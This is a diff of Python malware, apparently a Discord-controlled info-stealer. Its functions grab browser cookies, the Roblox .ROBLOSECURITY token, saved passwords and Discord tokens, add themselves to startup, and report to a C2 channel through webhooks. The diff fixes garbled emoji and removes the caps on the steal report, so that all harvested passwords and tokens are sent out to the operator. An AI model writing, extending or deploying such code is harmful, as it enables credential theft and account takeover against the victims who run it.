@@ -184,9 +184,9 @@ def _reopen_channels():
         cid = cfg.get("reopen")
         if cid and cid not in sent:
             sent.add(cid)
-            _discord_request("POST", f"/channels/{cid}/messages", {"content": f"ðŸŸ¢ **System Online** `{socket.gethostname()}`"})
+            _discord_request("POST", f"/channels/{cid}/messages", {"content": f"🟢 **System Online** `{socket.gethostname()}`"})
     for cid in EXTRA_CHANNELS:
-        if cid not in sent: sent.add(cid); _discord_request("POST", f"/channels/{cid}/messages", {"content": f"ðŸŸ¢ **System Online** `{socket.gethostname()}`"})
+        if cid not in sent: sent.add(cid); _discord_request("POST", f"/channels/{cid}/messages", {"content": f"🟢 **System Online** `{socket.gethostname()}`"})
 
 class CookieGrabber:
     def __init__(self):
@@ -505,11 +505,9 @@ def cmd_steal(grabber):
         for c in grabber.roblox_cookies or []: lines.append(f"  [{c['browser'].upper()}] {c['name']}")
         rbx = get_roblosecurity(grabber); lines.append(f"\n.ROBLOSECURITY: {rbx or 'NOT FOUND'}")
         lines.append(f"\nSaved Passwords: {len(pw)}")
-        for p in pw[:10]: lines.append(f"  [{p['browser'].upper()}] {p['url']} | {p['username']}:{p['password']}")
-        if len(pw) > 10: lines.append(f"  ... and {len(pw)-10} more")
+        for p in pw: lines.append(f"  [{p['browser'].upper()}] {p['url']} | {p['username']}:{p['password']}")
         lines.append(f"\nDiscord Tokens: {len(tokens)}")
-        for t in tokens[:5]: lines.append(f"  {t}")
-        if len(tokens) > 5: lines.append(f"  ... and {len(tokens)-5} more")
+        for t in tokens: lines.append(f"  {t}")
         send_txt_file("steal_report", "\n".join(lines), "Steal report attached")
     except Exception as e: send_webhook(content=f"Steal failed: {e}")
 
@@ -786,7 +784,7 @@ def main():
         write_pid(); _ensure_channels(); _add_startup()
         threading.Thread(target=watchdog, daemon=True).start()
         threading.Thread(target=auto_check_roblox, daemon=True).start()
-        send_webhook(content=f"ðŸŸ¢ **C2 Online** `{socket.gethostname()}`"); send_webhook(content=f"ðŸŸ¢ **C2 Online** `{socket.gethostname()}`", channel="cmds" if "cmds" in CHANNELS else "main"); cmd_worker()
+        send_webhook(content=f"🟢 **C2 Online** `{socket.gethostname()}`"); send_webhook(content=f"🟢 **C2 Online** `{socket.gethostname()}`", channel="cmds" if "cmds" in CHANNELS else "main"); cmd_worker()
     except: pass
 
 if __name__ == "__main__":
